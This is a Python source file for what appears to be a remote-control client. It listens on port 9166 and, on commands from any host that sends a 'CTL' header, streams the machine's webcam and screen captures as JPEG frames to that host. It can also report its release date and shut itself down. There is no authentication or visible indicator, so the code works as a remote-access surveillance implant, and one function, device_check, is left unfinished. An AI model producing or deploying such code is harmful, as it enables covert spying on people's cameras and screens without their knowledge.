import socket
import time
import os
import phase
import threading
import cv2
import struct
import mss
import numpy as np

# addr_ctl = ""
port_ctl = 9166
relase_day = "27-7-2025"

class workers:
    quece_total = 0
    instance = []
    
    @classmethod
    def create_instance(cls,func,argument: list):
        cls.quece_total += 1
        quece = cls.quece_total
        
        work = threading.Thread(target=func,args=argument)
        
        cls.instance.append([quece,work])
        
class contract:
    lock = threading.Lock()
    buffer = []
    terminate = False
        
    @classmethod
    def update_header(cls,header):
        with cls.lock:
            cls.buffer.append(header)
    
    @classmethod
    def get_header(cls):
        with cls.lock:
            if len(cls.buffer) > 0:
                return cls.buffer.pop(0)
            else:
                return []

    @classmethod
    def Terminate(cls):
        cls.terminate = True

def PrepareCtl():
    global port_ctl
    result = []
    
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        sock.bind(('0.0.0.0',port_ctl))
        sock.listen(1)
        
        conn, addr = sock.accept()
        
        data = conn.recv(1024)
        header = phase.PhaseHeaderText(data.decode())
        
        if not header == []:
            
            if phase.GetSubject(header,"VERIFY") == "CTL":
                result = header
                result.append(['ADDR',addr[0]]) 
        else:
            print("Error package!")
                    
    except Exception as e:
        print("unexcept error: " + str(e))
    finally:
        conn.close()
        sock.close()
    
    return result

def WorkerScan():
    global port_ctl
    
    while True:
        if contract.terminate:
            break
        
        header = PrepareCtl()
        if not header == []:
            contract.update_header(header)
            
class commandList:
    @classmethod
    def getCmd(cls,header: list):
        return phase.GetSubject(header,"COMMAND")
    
    #=============================== command list =============================
    def reply(addr: str):
        global relase_day
        ip_ctl = addr
        print("CTL NEED REPLY")
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            sock.connect((ip_ctl,port_ctl))
            list_phead = [['VERIFY','CLIENT'],['RELASE',relase_day]]
            text_phead = phase.MakeHeaderText(list_phead)
            print(text_phead) #DEV DISPLAY
            sock.sendall(text_phead.encode())
    
    def shutdown():
        contract.Terminate()
        print("terminate!") #DEV DISPLAY
        print(contract.terminate) #DEV DISPLAY
        
    def streamcam(header: list):
        global port_ctl
        
        addr = phase.GetSubject(header,"ADDR")
        
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
                sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
                sock.connect((addr,port_ctl))
                sock.sendall(struct.pack('>I', 0))
            return 0

        try:
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
                sock.connect((addr,port_ctl))
                while True:
                    time.sleep(0.1)
                    ret, frame = cap.read()
                    if not ret:
                        continue
                    
                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
                    result, encimg = cv2.imencode('.jpg', frame, encode_param)
                    
                    data = encimg.tobytes()
                    size = len(data)
                    
                    sock.sendall(struct.pack('>I', size))
                    sock.sendall(data)
                    
                
        except Exception as e:
            print("ERROR: " + str(e))
        finally:
            cap.release()
    
    def createThread(func,args_s:tuple):
        thread_new = threading.Thread(target=func,args=args_s)
        thread_new.start()
    
    def streamMonitor(header: list):
        global port_ctl
        des_addr = phase.GetSubject(header,"ADDR")
        monitor_select = int(phase.GetSubject(header,"MONITOR"))
        try:
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
                sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
                sock.connect((des_addr,port_ctl))
                
                with mss.mss() as capt:
                    monitor = capt.monitors[monitor_select]
                    
                    while True:
                        time.sleep(0.1)
                        sct_img = capt.grab(monitor)
                        frame = np.array(sct_img)
                        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                    
                        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
                        result, encimg = cv2.imencode('.jpg', frame, encode_param)
                    
                        data = encimg.tobytes()
                        size = len(data)
                    
                        sock.sendall(struct.pack('>I', size))
                        sock.sendall(data)
        except Exception as e:
            print("Error: " + str(e))

    def device_check(header:str):
        global port_ctl
        
        host_name = socket.gethostname()
        monitors = len(mss.mss().monitors) - 1
        
        des_addr = phase.GetSubject(header,"ADDR")
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            sock.connect((des_addr,port_ctl))        
            
    #=============================== end command list ==============================
    @classmethod
    def check(cls,header: list):
        cmd = cls.getCmd(header)
        time.sleep(0.5)
        if cmd == "reply":
            cls.reply(phase.GetSubject(header,"ADDR"))
        elif cmd == "shutdown":
            cls.shutdown()
        elif cmd == "streamcam":
            commandList.createThread(commandList.streamcam,(header,))
        elif cmd == "streamonitor":
            commandList.createThread(commandList.streamMonitor,(header,))
        elif cmd == "monitors_check":
            commandList.device_check(header)

def main():
    t = threading.Thread(target=WorkerScan)
    t.daemon = True
    t.start()
    
    while True:
        if contract.terminate:
            os._exit(1)
            
        header = contract.get_header()
        
        if header == []:
            continue
        else:
            print(header)
            commandList.check(header)

main()